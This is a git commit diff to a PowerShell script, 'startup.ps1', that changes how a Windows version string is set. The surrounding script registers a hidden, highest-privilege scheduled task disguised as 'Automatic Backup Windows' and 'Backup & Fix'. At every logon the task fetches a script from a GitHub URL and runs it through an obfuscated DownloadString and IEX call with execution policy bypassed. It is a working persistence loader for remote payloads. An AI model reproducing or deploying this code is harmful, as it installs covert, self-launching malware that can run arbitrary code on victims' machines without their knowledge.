1a87c700f3e35e684c8e28a24476647721701afc
43a1723 <hai1723notgay@gmail.com>
2024-06-19 19:02:50 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,5 +1,5 @@
 $os = Get-CimInstance Win32_OperatingSystem
-$version_machine = 0
+$version_machine = $os.Version
 
 
 $powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
@@ -7,7 +7,7 @@ $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode
 $need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need I'E'X($download)" 
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Automatic Backup Windows $os.Version"
+$task_name = "Automatic Backup Windows $version_machine"
 $task_desc = "Always Backup & Fix If Windows $version_machine ERROR. "
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
